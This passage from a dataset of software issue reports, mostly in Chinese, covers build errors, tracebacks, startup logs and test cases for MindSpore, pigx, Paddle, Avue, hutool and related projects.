ype"":""float16"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""output_0_4""},{""data_type"":""float16"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""output_0_5""},{""data_type"":""float16"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""output_0_6""}],""parallel_fusion"":{""core_num"":[4,1,1,256,1,1,1],""fusion_type"":""block_fusion"",""sub_graph"":[[""output_0_0""],[""output_0_1""],[""output_0_2""],[""output_0_3""],[""output_0_4""],[""output_0_5""],[""output_0_6""]],""type_info"":[]},""platform"":""AKG"",""process"":""cuda"",""target_info"":{""compute_capability"":""7.0"",""sm_count"":80},""version"":1}! build attrs: None"
【MindSpore】【Ascend】【C类】【pvnet】数据集处理失败，训练脚本需要适配,"一、问题现象： 1、开始处理数据集：，脚本报错信息如下： 2、数据集处理失败，处理部分需要在资料中详细描述。cat数据集可正常处理，ape,can,cam三种类别数据集处理无法生成pkl文件。修改model_utils/generateposedb.py文件后重新执行数据集处理，无法生成pkl文件，报错部分如下： 二、软件版本: -- CANN 版本: (CANN 5.0.4 B065) -- Mindspore 版本：1.6.1 --Python 版本:Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04   <code>: python3 model_utils/generateposedb.py Traceback (most recent call last): File ""/home/wx/pvnet/model_utils/generate_posedb.py"", line 214, in &lt;module&gt; generateposedb(item, cfg.eval_dataset) File ""/home/wx/pvnet/model_utils/generate_posedb.py"", line 206, in generateposedb LineModImageDB(pvnet_path, cls_name, has_fuse_set=True, has_render_set=True) File ""/home/wx/pvnet/model_utils/generate_posedb.py"", line 87, in __init__ self.fuse_set = self.collect_fuse_info() File ""/home/wx/pvnet/model_utils/generate_posedb.py"", line 181, in collect_fuse_info if np.sum(mask == (cfg.linemod_cls_names.index(self.cls_name) + 1)) &lt; 400: continue AttributeError: 'Config' object has no attribute 'linemod_cls_names' Traceback (most recent call last): File ""model_utils/generate_posedb.py"", line 214, in &lt;module&gt; generateposedb(item, cfg.eval_dataset) File ""model_utils/generate_posedb.py"", line 206, in generateposedb LineModImageDB(pvnet_path, cls_name, has_fuse_set=True, has_render_set=True) File ""model_utils/generate_posedb.py"", line 56, in __init__ self.render_set = self.collect_render_set_info(self.render_pkl, self.render_dir) File ""model_utils/generate_posedb.py"", line 101, in collect_render_set_info data['RT'] = read_pickle(os.path.join(self.linemod_dir, render_dir, '{}_RT.pkl'.format(k)))['RT'] File ""/ssd1/wx/pvnet/model_utils/data_file_utils.py"", line 25, in read_pickle with open(pkl_path, 'rb') as f: FileNotFoundError: [Errno 2] No such file or directory: '/data1/pvnet_data/LINEMOD/renders/ape/0_RT.pkl'"
"gateway已启动，但访问swagger 报 Could not render e, see the console.","pigx版本: 3.0 操作系统: windows server 2012 R2 是否修改包名: 否 刚部署是能正常访问的，服务器突然关机，然后再开机，并启动 pigx-register,pigx-gateway，访问http://pigx-gateway:9999/swagger-ui.html 报 Whitelabel Error Page swagger。 然后再重启服务器，再启动 pigx-register,pigx-gateway，访问http://pigx-gateway:9999/swagger-ui.html 就报 Could not render e, see the console. 以上， nacos能正常访问   <code>: 启动日志如下 2019-06-11 19:10:59.289 INFO 5852 --- [ main] ptablePropertiesBeanFactoryPostProcessor : Post-processing PropertySource instances 2019-06-11 19:10:59.550 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource configurationProperties [org.springframework.boot.context.properties.source.ConfigurationPropertySourcesPropertySource] to AOP Proxy 2019-06-11 19:10:59.555 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource gateway-properties [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:10:59.555 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource bootstrap [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:10:59.556 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource systemProperties [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:10:59.556 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource systemEnvironment [org.springframework.boot.env.SystemEnvironmentPropertySourceEnvironmentPostProcessor$OriginAwareSystemEnvironmentPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:10:59.557 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource random [org.springframework.boot.env.RandomValuePropertySource] to EncryptablePropertySourceWrapper 2019-06-11 19:10:59.557 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource springCloudClientHostInfo [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:10:59.557 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource applicationConfig: [classpath:/bootstrap.yml] [org.springframework.boot.env.OriginTrackedMapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:10:59.643 INFO 5852 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration' of type [org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration$$EnhancerBySpringCGLIB$$1b34f730] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2019-06-11 19:10:59.711 INFO 5852 --- [ main] c.u.j.filter.DefaultLazyPropertyFilter : Property Filter custom Bean not found with name 'encryptablePropertyFilter'. Initializing Default Property Filter 2019-06-11 19:10:59.723 INFO 5852 --- [ main] c.u.j.r.DefaultLazyPropertyResolver : Property Resolver custom Bean not found with name 'encryptablePropertyResolver'. Initializing Default Property Resolver 2019-06-11 19:10:59.729 INFO 5852 --- [ main] c.u.j.d.DefaultLazyPropertyDetector : Property Detector custom Bean not found with name 'encryptablePropertyDetector'. Initializing Default Property Detector 2019-06-11 19:11:00.384 INFO 5852 --- [ main] o.s.c.a.n.c.NacosPropertySourceBuilder : Loading nacos data, dataId: 'application-dev.yml', group: 'DEFAULT_GROUP' 2019-06-11 19:11:00.431 INFO 5852 --- [ main] o.s.c.a.n.c.NacosPropertySourceBuilder : Loading nacos data, dataId: 'pigx-gateway-dev.yml', group: 'DEFAULT_GROUP' 2019-06-11 19:11:00.431 INFO 5852 --- [ main] b.c.PropertySourceBootstrapConfiguration : Located property source: CompositePropertySource {name='NACOS', propertySources=[NacosPropertySource {name='pigx-gateway-dev.yml'}, NacosPropertySource {name='pigx-gateway.yml'}, NacosPropertySource {name='application-dev.yml'}]} 2019-06-11 19:11:00.431 INFO 5852 --- [ main] EnableEncryptablePropertiesConfiguration : Bootstraping jasypt-string-boot auto configuration in context: pigx-gateway-1 2019-06-11 19:11:00.431 INFO 5852 --- [ main] c.p.pigx.gateway.PigxGatewayApplication : The following profiles are active: dev 2019-06-11 19:11:01.477 INFO 5852 --- [ main] .s.d.r.c.RepositoryConfigurationDelegate : Multiple Spring Data modules found, entering strict repository configuration mode! 2019-06-11 19:11:01.477 INFO 5852 --- [ main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data repositories in DEFAULT mode. 2019-06-11 19:11:01.509 INFO 5852 --- [ main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 16ms. Found 0 repository interfaces. 2019-06-11 19:11:01.540 WARN 5852 --- [ main] o.s.boot.actuate.endpoint.EndpointId : Endpoint ID 'nacos-config' contains invalid characters, please migrate to a valid format. 2019-06-11 19:11:01.540 WARN 5852 --- [ main] o.s.boot.actuate.endpoint.EndpointId : Endpoint ID 'nacos-discovery' contains invalid characters, please migrate to a valid format. 2019-06-11 19:11:01.571 WARN 5852 --- [ main] o.s.boot.actuate.endpoint.EndpointId : Endpoint ID 'service-registry' contains invalid characters, please migrate to a valid format. 2019-06-11 19:11:01.587 WARN 5852 --- [ main] o.s.boot.actuate.endpoint.EndpointId : Endpoint ID 'hystrix.stream' contains invalid characters, please migrate to a valid format. 2019-06-11 19:11:01.852 INFO 5852 --- [ main] o.s.cloud.context.scope.GenericScope : BeanFactory id=55eaedbe-521f-3cfe-8f4c-3d2938d63472 2019-06-11 19:11:01.868 INFO 5852 --- [ main] ptablePropertiesBeanFactoryPostProcessor : Post-processing PropertySource instances 2019-06-11 19:11:01.883 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource bootstrapProperties [org.springframework.core.env.CompositePropertySource] to EncryptableEnumerablePropertySourceWrapper 2019-06-11 19:11:01.883 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource configurationProperties [org.springframework.boot.context.properties.source.ConfigurationPropertySourcesPropertySource] to AOP Proxy 2019-06-11 19:11:01.883 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource gateway-properties [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:01.883 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource systemProperties [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:01.883 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource systemEnvironment [org.springframework.boot.env.SystemEnvironmentPropertySourceEnvironmentPostProcessor$OriginAwareSystemEnvironmentPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:01.883 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource random [org.springframework.boot.env.RandomValuePropertySource] to EncryptablePropertySourceWrapper 2019-06-11 19:11:01.883 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource applicationConfig: [classpath:/application.properties] [org.springframework.boot.env.OriginTrackedMapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:01.883 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource springCloudClientHostInfo [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:01.883 INFO 5852 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource defaultProperties [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:01.899 INFO 5852 --- [ main] c.u.j.filter.DefaultLazyPropertyFilter : Property Filter custom Bean not found with name 'encryptablePropertyFilter'. Initializing Default Property Filter 2019-06-11 19:11:02.258 INFO 5852 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration' of type [org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration$$EnhancerBySpringCGLIB$$1b34f730] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2019-06-11 19:11:02.461 INFO 5852 --- [ main] c.u.j.r.DefaultLazyPropertyResolver : Property Resolver custom Bean not found with name 'encryptablePropertyResolver'. Initializing Default Property Resolver 2019-06-11 19:11:02.461 INFO 5852 --- [ main] c.u.j.d.DefaultLazyPropertyDetector : Property Detector custom Bean not found with name 'encryptablePropertyDetector'. Initializing Default Property Detector 2019-06-11 19:11:02.949 WARN 5852 --- [ main] c.n.c.sources.URLConfigurationSource : No URLs will be polled as dynamic configuration sources. 2019-06-11 19:11:02.949 INFO 5852 --- [ main] c.n.c.sources.URLConfigurationSource : To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath. 2019-06-11 19:11:02.949 WARN 5852 --- [ main] c.n.c.sources.URLConfigurationSource : No URLs will be polled as dynamic configuration sources. 2019-06-11 19:11:02.949 INFO 5852 --- [ main] c.n.c.sources.URLConfigurationSource : To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath. 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [After] 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [Before] 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [Between] 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [Cookie] 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [Header] 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [Host] 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [Method] 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [Path] 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [Query] 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [ReadBodyPredicateFactory] 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [RemoteAddr] 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [Weight] 2019-06-11 19:11:03.762 INFO 5852 --- [ main] o.s.c.g.r.RouteDefinitionRouteLocator : Loaded RoutePredicateFactory [CloudFoundryRouteService] 2019-06-11 19:11:04.247 INFO 5852 --- [ main] o.s.b.a.e.web.EndpointLinksResolver : Exposing 23 endpoint(s) beneath base path '/actuator' 2019-06-11 19:11:04.732 INFO 5852 --- [ main] o.s.s.c.ThreadPoolTaskScheduler : Initializing ExecutorService 2019-06-11 19:11:05.528 INFO 5852 --- [ main] io.lettuce.core.EpollProvider : Starting without optional epoll library 2019-06-11 19:11:05.528 INFO 5852 --- [ main] io.lettuce.core.KqueueProvider : Starting without optional kqueue library 2019-06-11 19:11:05.810 INFO 5852 --- [ main] o.s.b.web.embedded.netty.NettyWebServer : Netty started on port(s): 9999 2019-06-11 19:11:05.841 INFO 5852 --- [ main] o.s.c.a.n.registry.NacosServiceRegistry : nacos registry, pigx-gateway 192.168.1.68:9999 register finished 2019-06-11 19:11:05.841 INFO 5852 --- [ main] c.p.pigx.gateway.PigxGatewayApplication : Started PigxGatewayApplication in 7.823 seconds (JVM running for 8.956) 2019-06-11 19:11:06.060 INFO 5852 --- [x-register_8848] ptablePropertiesBeanFactoryPostProcessor : Post-processing PropertySource instances 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource configurationProperties [org.springframework.boot.context.properties.source.ConfigurationPropertySourcesPropertySource] to AOP Proxy 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource gateway-properties [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource bootstrap [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource refreshArgs [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource systemProperties [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource systemEnvironment [org.springframework.boot.env.SystemEnvironmentPropertySourceEnvironmentPostProcessor$OriginAwareSystemEnvironmentPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource random [org.springframework.boot.env.RandomValuePropertySource] to EncryptablePropertySourceWrapper 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource applicationConfig: [classpath:/bootstrap.yml] [org.springframework.boot.env.OriginTrackedMapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource springCloudClientHostInfo [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration' of type [org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration$$EnhancerBySpringCGLIB$$1b34f730] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] c.u.j.filter.DefaultLazyPropertyFilter : Property Filter custom Bean not found with name 'encryptablePropertyFilter'. Initializing Default Property Filter 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] c.u.j.r.DefaultLazyPropertyResolver : Property Resolver custom Bean not found with name 'encryptablePropertyResolver'. Initializing Default Property Resolver 2019-06-11 19:11:06.075 INFO 5852 --- [x-register_8848] c.u.j.d.DefaultLazyPropertyDetector : Property Detector custom Bean not found with name 'encryptablePropertyDetector'. Initializing Default Property Detector 2019-06-11 19:11:06.153 INFO 5852 --- [x-register_8848] o.s.c.a.n.c.NacosPropertySourceBuilder : Loading nacos data, dataId: 'pigx-gateway-dev.yml', group: 'DEFAULT_GROUP' 2019-06-11 19:11:06.169 INFO 5852 --- [x-register_8848] b.c.PropertySourceBootstrapConfiguration : Located property source: CompositePropertySource {name='NACOS', propertySources=[NacosPropertySource {name='pigx-gateway-dev.yml'}, NacosPropertySource {name='pigx-gateway.yml'}, NacosPropertySource {name='application-dev.yml'}]} 2019-06-11 19:11:06.169 INFO 5852 --- [x-register_8848] EnableEncryptablePropertiesConfiguration : Bootstraping jasypt-string-boot auto configuration in context: pigx-gateway-1 2019-06-11 19:11:06.169 INFO 5852 --- [x-register_8848] o.s.boot.SpringApplication : The following profiles are active: dev 2019-06-11 19:11:06.185 INFO 5852 --- [x-register_8848] o.s.boot.SpringApplication : Started application in 0.266 seconds (JVM running for 9.293) 2019-06-11 19:11:06.310 INFO 5852 --- [x-register_8848] u.j.c.RefreshScopeRefreshedEventListener : Refreshing cached encryptable property sources 2019-06-11 19:11:06.310 INFO 5852 --- [x-register_8848] u.j.c.RefreshScopeRefreshedEventListener : Refreshing cached encryptable property sources 2019-06-11 19:11:06.310 INFO 5852 --- [x-register_8848] o.s.c.e.event.RefreshEventListener : Refresh keys changed: []"
build failed with openblas,"When , I got CMake Error at cmake/external/openblas.cmake:118 (IF): if given arguments: ""EQUAL"" ""MKLML"" Unknown arguments specified Call Stack (most recent call first): CMakeLists.txt:123 (include)   <code>: cmake .. -DWITH_GPU=OFF -DWITH_MKLDNN=OFF -DWITH_MKLML=OFF"
dgiot@v4.5.3后 开发版使用问题相关说明,此issues是基于dgiot@v4.5.3后的正在开发功能的相关说明 dgiot@v4.5.4-RC(计划) 功能说明 1. 新增用户自定义topic 2. 适配下发控制指令 如果你使用dgiot 开发版遇到相关问题，请参阅如下教程 产品管理 新建产品失败： <em>进入数据库方法请点击</em>   <code>: product topics Array Object profile content Object Device address string Device
_c_expression ImportError,"_c_expression ImportError / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : master -- Python version : 3.9.13 -- OS platform and distribution : Win10 21H2 -- GCC/Compiler version : MSVC 14.29.30133 (cl 19.29.30146) (/): /mode pynative /mode graph Build From Source Import success   <code>: In [1]: import _c_mindrecord as cmr In [2]: import _c_dataengine as cde In [3]: import _c_expression as cexp --------------------------------------------------------------------------- ImportError Traceback (most recent call last) &lt;ipython-input-3-b34ffe9c4160&gt; in &lt;cell line: 1&gt;() ----&gt; 1 import _c_expression as cexp ImportError: generic_type: type ""Number"" has a non-default holder type while its base ""mindspore::Type"" does not"
2.8.12 复杂表头 使用formslot:true 进行行编辑组件扩展，放children 里的column 无法正常渲染编辑组件，移出来就可以使用,"Avue版本 2.8.12 代码：avue 配置参数： 放外面的筛选条件可以正常使用form自定义列，children 中的不能正常渲染出input   <code>: export function getSubCrudOption(rowData) { let { $sourceEventtypeId: sourceEventName, $targetEventtypeId: targetEventName } = rowData; let gridColumn = [ { label: '筛选条件', prop: 'sourcefilter', formslot: true, cell: true }, { label: sourceEventName, children: [{ label: '筛选条件', prop: 'sourcefilter', formslot: true, cell: true }, { label: '分组条件', prop: 'sourcegroup', formslot: true, cell: true }, { label: '取值规则', prop: 'sourcevalue', formslot: true, cell: true }] }, { label: targetEventName, children: [{ label: '筛选条件', prop: 'targetfilter', formslot: true, cell: true }, { label: '分组条件', prop: 'targetgroup', formslot: true, cell: true }, { label: '取值规则', prop: 'targetvalue', formslot: true, cell: true }] }, { prop: ""remark"", label: ""备注"", minWidth: 150, cell: true }, ]; let option = { height: 'auto', calcHeight: 80, align: 'center', excelBtn: false, tip: false, searchShow: false, refreshBtn: false, columnBtn: false, menu: false, searchMenuSpan: 6, highlightCurrentRow: false, editBtn: false, addBtn: false, delBtn: false, border: true, index: true, selection: false, searchIcon: false, dialogClickModal: false, column: gridColumn }; return option; }"
JSON TypeReference转换问题,"JDK版本： oracle jdk 11 hutool版本： 5.4.0   <code>: public static void main(String[] args) { // fastjson：正常转换不报错 Object data = ""123""; String s = JSON.toJSONString(data); String s1 = JSON.parseObject(s, new TypeReference&lt;String&gt;() { }); System.out.println(""fastjson = "" + s1); // hutool：Exception in thread ""main"" cn.hutool.json.JSONException: A JSONObject text must begin with '{' at 1 [character 2 line 1] String s2 = JSONUtil.toBean(JSONUtil.parse(data), new cn.hutool.core.lang.TypeReference&lt;String&gt;() { }, true); System.out.println(""hutool = "" + s2); }"
[CT][MS][OP]AdjustHue core dump at cpu,"以下两种场景在CPU 上执行会coredump / 硬件环境: CPU /device cpu : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): pynative， graph /mode pynative /mode graph 执行以上用例 用例执行pass   <code>: def test_adjusthue_input_5d(): image = Tensor(np.random.random(size=(23, 23, 18, 21, 3)).astype(np.float32)) delta = Tensor(np.random.rand(), dtype=mstype.float32) fact = AdjustHueMock(inputs=[image, delta]) fact.forward_cmp() def test_adjusthue_input_7d_fp32(): image = Tensor(np.random.random(size=(8, 9, 6, 8, 6, 7, 3)).astype(np.float32)) delta = Tensor(np.random.rand(), dtype=mstype.float32) fact = AdjustHueMock(inputs=[image, delta]) fact.forward_cmp() def test_adjusthue_input_5d(): image = Tensor(np.random.random(size=(23, 23, 18, 21, 3)).astype(np.float32)) delta = Tensor(np.random.rand(), dtype=mstype.float32) fact = AdjustHueMock(inputs=[image, delta]) fact.forward_cmp() def test_adjusthue_input_7d_fp32(): image = Tensor(np.random.random(size=(8, 9, 6, 8, 6, 7, 3)).astype(np.float32)) delta = Tensor(np.random.rand(), dtype=mstype.float32) fact = AdjustHueMock(inputs=[image, delta]) fact.forward_cmp() # pytest test_adjusthue.py::test_adjusthue_input_7d_fp32 ======================================================= test session starts ======================================================= platform linux -- Python 3.7.5, pytest-5.3.5, py-1.8.1, pluggy-0.13.1 rootdir: /home/cao_test/MindSporeTest/operations plugins: timeout-1.4.2, repeat-0.9.1 collected 1 item test_adjusthue.py Fatal Python error: Fatal Python error: Fatal Python error: Fatal Python error: Segmentation faultFatal Python er ror: Fatal Python error: Fatal Python error: Fatal Python error: Fatal Python error: Fatal Python error: Segmentation faultSegmenta tion fault Segmentation fault (core dumped) /MindSporeTest/operations# pytest test_adjusthue.py::test_adjusthue_input_5d ======================================================= test session starts ======================================================= platform linux -- Python 3.7.5, pytest-5.3.5, py-1.8.1, pluggy-0.13.1 rootdir: /home/cao_test/MindSporeTest/operations plugins: timeout-1.4.2, repeat-0.9.1 collected 1 item test_adjusthue.py Fatal Python error: Fatal Python error: Fatal Python error: Fatal Python error: Fatal Python error: Fatal Python error: Fatal Python error: Fatal Python error: Fatal Python error: Segmentation faultSegmentation faultSegmentation faultSegmentati on faultSegmentation faultSegmentation fault (core dumped)"
Need to optimize SE-ResNeXt 152 model on ImageNet dataset on Fluid.,"以下数据来自 @BigFishMaster , Fluid和PyTorch的对比：   <code>: paddle-P40-1-card(无内存优化), max batch size=10, speed(fp+bp): 1.00sec paddle-P40-1-card(有内存优化), max batch size=25, speed(fp+bp): 1.90sec paddle-P40-8-card(无内存优化), max batch size=80, speed(fp+bp): 2.35sec pytorch-P40-1-card, max batch size=48, speed(fp+bp): 2.06sec pytorch-P40-8-card, max batch size=384, speed(fp+bp): 2.77sec"
monitor一直打印异常com.fasterxml.jackson.databind.exc.InvalidDefinitionException,"pig版本: 3.4.7 是否修改包名: 否 按顺序启动   <code>: org.springframework.http.converter.HttpMessageConversionException: Type definition error: [simple type, class de.codecentric.boot.admin.server.domain.values.Registration]; nested exception is com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Cannot construct instance of `de.codecentric.boot.admin.server.domain.values.Registration` (no Creators, like default constructor, exist): cannot deserialize from Object value (no delegate- or property-based Creator) at [Source: (org.springframework.util.StreamUtils$NonClosingInputStream); line: 1, column: 2] at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.readJavaType(AbstractJackson2HttpMessageConverter.java:388) ~[spring-web-5.3.16.jar:5.3.16] at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.read(AbstractJackson2HttpMessageConverter.java:343) ~[spring-web-5.3.16.jar:5.3.16] at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodArgumentResolver.readWithMessageConverters(AbstractMessageConverterMethodArgumentResolver.java:185) ~[spring-webmvc-5.3.16.jar:5.3.16] at org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor.readWithMessageConverters(RequestResponseBodyMethodProcessor.java:160) ~[spring-webmvc-5.3.16.jar:5.3.16] at org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor.resolveArgument(RequestResponseBodyMethodProcessor.java:133) ~[spring-webmvc-5.3.16.jar:5.3.16] at org.springframework.web.method.support.HandlerMethodArgumentResolverComposite.resolveArgument(HandlerMethodArgumentResolverComposite.java:122) ~[spring-web-5.3.16.jar:5.3.16] at org.springframework.web.method.support.InvocableHandlerMethod.getMethodArgumentValues(InvocableHandlerMethod.java:179) ~[spring-web-5.3.16.jar:5.3.16] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:146) ~[spring-web-5.3.16.jar:5.3.16] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117) ~[spring-webmvc-5.3.16.jar:5.3.16] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) ~[spring-webmvc-5.3.16.jar:5.3.16] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) ~[spring-webmvc-5.3.16.jar:5.3.16] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.3.16.jar:5.3.16] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067) ~[spring-webmvc-5.3.16.jar:5.3.16] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) ~[spring-webmvc-5.3.16.jar:5.3.16] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) [spring-webmvc-5.3.16.jar:5.3.16] at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) [spring-webmvc-5.3.16.jar:5.3.16] at javax.servlet.http.HttpServlet.service(HttpServlet.java:665) [javax.servlet-api-4.0.1.jar:4.0.1] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) [spring-webmvc-5.3.16.jar:5.3.16] at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) [javax.servlet-api-4.0.1.jar:4.0.1] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at de.codecentric.boot.admin.server.ui.web.servlet.HomepageForwardingFilter.doFilter(HomepageForwardingFilter.java:78) [spring-boot-admin-server-ui-2.6.2.jar:2.6.2] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.16.Final.jar:2.2.16.Final] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:327) [spring-security-web-5.6.2.jar:5.6.2] at 